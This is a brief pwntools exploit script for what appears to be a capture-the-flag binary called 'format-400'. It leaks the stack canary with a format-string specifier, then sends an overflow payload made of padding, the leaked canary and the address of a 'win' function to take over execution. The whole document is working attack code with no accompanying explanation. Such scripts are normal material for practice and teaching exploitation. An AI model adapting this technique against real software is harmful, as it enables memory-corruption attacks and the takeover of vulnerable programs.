#!/usr/bin/env python
from pwn import *

e = ELF("./format-400")
p = process('./format-400')


p.sendline("%23$p")
p.recvuntil("<<< Hello, 0x")
canary=p64(int(p.recvline().strip(),16))
win = p64(e.sym['win'])

chain = b'A'*136
chain += canary
chain += b'B'*8
chain += win

p.sendline(chain)
p.interactive()
